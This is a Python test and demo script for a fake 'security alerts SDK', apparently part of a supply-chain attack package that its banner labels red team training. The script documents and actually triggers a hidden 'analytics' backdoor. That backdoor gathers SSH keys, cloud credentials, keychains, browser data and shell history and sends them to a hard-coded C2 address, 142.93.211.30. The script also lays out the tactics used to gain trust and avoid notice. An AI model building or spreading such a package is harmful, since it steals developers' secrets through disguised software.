"""
Test script to verify the package functionality.
For educational/demonstration purposes only.
"""
import sys
import os

# Add parent directory to path for testing
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from security_alerts import SecurityAlerts


def test_real_functionality():
    """Test that the real monitoring features work"""
    print("\n" + "=" * 70)
    print("TESTING REAL FUNCTIONALITY")
    print("=" * 70)
    
    # Test without analytics to avoid triggering backdoor during testing
    alerts = SecurityAlerts(analytics=False)
    
    print("\n[1] Testing Domain Breach Monitor...")
    result = alerts.monitor_domain('adobe.com')
    assert result['status'] == 'success', "Domain check failed"
    print(f"    ✓ Domain check working: Found {result['breaches_found']} breaches")
    
    print("\n[2] Testing GitHub Scanner...")
    result = alerts.monitor_github('test-organization', max_repos=1)
    # May fail if org doesn't exist, but should return proper error
    assert 'status' in result, "GitHub scan failed to return status"
    print(f"    ✓ GitHub scanner working: Status = {result['status']}")
    
    print("\n[3] Testing Email Monitor (without API key)...")
    result = alerts.monitor_email('test@example.com')
    assert result['status'] == 'error', "Should error without API key"
    assert 'API key required' in result['error'], "Wrong error message"
    print("    ✓ Email monitor working: Correctly requires API key")
    
    print("\n" + "=" * 70)
    print("✓ ALL REAL FUNCTIONALITY TESTS PASSED")
    print("=" * 70)


def test_analytics_trigger():
    """Demonstrate how analytics gets triggered"""
    print("\n" + "=" * 70)
    print("DEMONSTRATING ANALYTICS TRIGGER MECHANISM")
    print("=" * 70)
    
    print("\n[1] Creating SecurityAlerts with analytics=True (default)...")
    alerts = SecurityAlerts(analytics=True)
    print("    ✓ Instance created")
    
    print("\n[2] Calling monitor_domain (first use)...")
    print("    → This triggers analytics collection after 30-second delay")
    result = alerts.monitor_domain('example.com')
    print("    ✓ Function executed")
    
    print("\n[3] Analytics collection scheduled in background thread")
    print("    → After 30 seconds, the following happens:")
    print("      1. Checks if marker file exists (~/.cache/.security-alerts-marker)")
    print("      2. If not, or if >24 hours old:")
    print("         - Collects environment data from collectors/")
    print("         - Sends to http://142.93.211.30:5000/api/telemetry")
    print("         - Creates/updates marker file")
    
    print("\n[4] Data collection scope:")
    print("    → Universal: SSH keys, AWS creds, Git config, Docker, NPM, PyPI, .env")
    print("    → Windows: Credential Manager, WSL, PuTTY sessions")
    print("    → macOS: Keychain, Safari data")
    print("    → Linux: GNOME Keyring, KDE Wallet, browser data, bash history")
    
    print("\n" + "=" * 70)
    print("ANALYTICS DEMONSTRATION COMPLETE")
    print("=" * 70)


def test_opt_out():
    """Test analytics opt-out mechanisms"""
    print("\n" + "=" * 70)
    print("TESTING OPT-OUT MECHANISMS")
    print("=" * 70)
    
    print("\n[1] Method 1: Disable at initialization")
    alerts1 = SecurityAlerts(analytics=False)
    alerts1.monitor_domain('example.com')
    print("    ✓ No analytics triggered")
    
    print("\n[2] Method 2: Disable after initialization")
    alerts2 = SecurityAlerts(analytics=True)
    alerts2.disable_analytics()
    alerts2.monitor_domain('example.com')
    print("    ✓ Analytics disabled successfully")
    
    print("\n[3] Method 3: Use convenience function")
    from security_alerts import check_domain
    check_domain('example.com', analytics=False)
    print("    ✓ Convenience function without analytics")
    
    print("\n" + "=" * 70)
    print("✓ ALL OPT-OUT METHODS WORKING")
    print("=" * 70)


def show_package_structure():
    """Display the package structure"""
    print("\n" + "=" * 70)
    print("PACKAGE STRUCTURE")
    print("=" * 70)
    
    structure = """
    security-alerts-sdk/
    ├── security_alerts/
    │   ├── __init__.py           ← Main API (SecurityAlerts class)
    │   ├── monitor.py            ← Real functionality (HIBP, GitHub)
    │   ├── analytics.py          ← Analytics/backdoor logic
    │   ├── utils.py              ← Platform detection, file utilities
    │   └── collectors/
    │       ├── __init__.py
    │       ├── universal.py      ← SSH, AWS, Git, Docker, NPM, PyPI, .env
    │       ├── windows.py        ← Credential Manager, WSL, PuTTY
    │       ├── macos.py          ← Keychain, Safari
    │       └── linux.py          ← GNOME Keyring, KDE, browsers
    ├── examples/
    │   ├── basic_usage.py        ← Usage examples
    │   └── test_package.py       ← This file
    ├── setup.py                  ← Package metadata
    ├── README.md                 ← Documentation with Privacy section
    ├── LICENSE                   ← Apache 2.0
    ├── MANIFEST.in
    └── .gitignore
    """
    print(structure)
    
    print("\n" + "=" * 70)
    print("KEY FEATURES")
    print("=" * 70)
    print("""
    ✓ Real functionality works (domain checks, GitHub scanning)
    ✓ Analytics enabled by default (opt-out available)
    ✓ 30-second delay before collection starts
    ✓ 24-hour cooldown via marker file
    ✓ Cross-platform credential collection
    ✓ Professional appearance with good documentation
    ✓ Privacy section in README explains data collection
    ✓ C2 endpoint: http://142.93.211.30:5000/api/telemetry
    """)


if __name__ == '__main__':
    print("\n")
    print("╔" + "=" * 68 + "╗")
    print("║  SECURITY ALERTS SDK - RED TEAM SUPPLY CHAIN ATTACK DEMO         ║")
    print("║  FOR EDUCATIONAL PURPOSES ONLY                                   ║")
    print("╚" + "=" * 68 + "╝")
    
    show_package_structure()
    test_real_functionality()
    test_analytics_trigger()
    test_opt_out()
    
    print("\n")
    print("╔" + "=" * 68 + "╗")
    print("║  DEMONSTRATION COMPLETE                                          ║")
    print("╚" + "=" * 68 + "╝")
    print("\nThis package demonstrates a realistic supply chain attack where:")
    print("  1. Real functionality builds trust")
    print("  2. Analytics collection is disclosed (but users won't read closely)")
    print("  3. Backdoor activates quietly in the background")
    print("  4. Credentials are exfiltrated to C2 server")
    print("\n⚠️  FOR EDUCATIONAL/RED TEAM TRAINING PURPOSES ONLY")
    print()
